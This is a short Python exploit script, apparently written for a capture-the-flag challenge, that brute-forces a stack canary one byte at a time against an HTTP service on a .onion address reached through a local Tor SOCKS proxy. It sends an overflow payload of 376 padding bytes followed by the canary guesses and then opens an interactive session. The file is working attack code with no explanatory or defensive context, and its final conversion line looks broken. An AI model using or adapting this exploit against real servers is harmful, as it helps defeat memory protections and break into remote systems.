from pwn import *
import socks

#raw_input("Ready?")

payload = "GET /....// HTTP/1.1 "
payload += "A" * 376

canary = "\x00\x26\x3d\x70\xb0\x21\x02"
i = 0
while (1):

  s = socks.socksocket()
  s.set_proxy(socks.SOCKS4, 'localhost', 9050)
  s.connect(("xk5ubmdbh4esc3ny.onion", 80))
  p = remote.fromsocket(s)

  p.send(payload + canary + chr(i))
  log.info(i)
  s = p.recv(timeout = 1)
  try:
    s1 = p.recv(timeout = 1)
  except EOFError:
    s1 = ""

  if not "Nice try but no" in s and len(s1) != 17:
    log.info("Found " + str(len(canary)))
    canary = canary + chr(i)
    log.info("0x" + canary.encode('hex'))
    i = -1
  if len(canary) == 8:
    break
  p.close()
  i = i + 1

log.info("0x" + canary.encode('hex'))
log.info(canary)
log.info(int(canary,16))
p.interactive()

# canary = 0x0029c8c373dc4a3c